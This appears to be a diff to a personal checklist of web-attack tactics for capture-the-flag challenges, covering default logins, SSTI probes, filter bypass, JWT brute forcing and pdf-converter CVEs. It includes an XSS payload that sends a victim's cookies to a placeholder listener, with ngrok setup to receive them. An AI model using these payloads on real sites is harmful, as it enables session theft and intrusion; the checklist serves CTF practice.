@@ -1,3 +1,5 @@
+- PHP challenges are always either LFI, webshell uploads, type juggling or a mix of the 3!
+
 - Go through robots.txt and sitemap.xml
 - Check if it shows Server: and if anything's vulnerable
 
@@ -10,20 +12,16 @@
 
 - Facing login page:
 	- Try admin:admin
-	- Try signup as admin:admin
+	- Try signup as admin:randomPass
 	- Login as a normal user and then try to retrieve cookie through a posting page like 
 			- <script>new Image().src='http://listening?c='+document.cookie</script>
 			- Note: You could use ngrok to host for free to receive the bug by doing 
 				- python3 -m http.server 8008
 				- ngrok http 8008
 
-- Facing an text to pdf functionlity where your details get turned into pdf to view
-	- In burp, enable binary in scope and try to find out the version of the pdf converter and look for previous cve's to exploit and google around
-Facing giving many details about yourself:
-	- You could try SSTI by putting this payload in everything:
-	- ```      {{8*8}}
-	        {{10+10}}             ```
-
+- Facing an text to pdf functionality where your details get turned into pdf to view
+	- In burp, enable binary in scope and try to find out the version of the pdf converter and look for previous cve's to exploit and google around.
+	- When going through the burp suite response, you might find out about the type of pdf producer and look for cve's.
 
 - Facing any comment section, or posting functionality like todo list etc.
 	- We can try <h1>hi</h1>
@@ -33,3 +31,12 @@ Facing giving many details about yourself:
 	- In SSTI bypass, convert ls flag.txt to hex \x version for encoding and bypass
 
 - If jwt is used, we could try to brute force it (https://www.youtube.com/watch?v=3LRZsnSyDrQ)
+
+- Facing giving many details about yourself (profile page):
+	- You could try SSTI by putting this payload in everything:
+	-  `` {{8*8}}
+	-  `` {{10+10}}
+	        
+
+- XSS:
+	- 
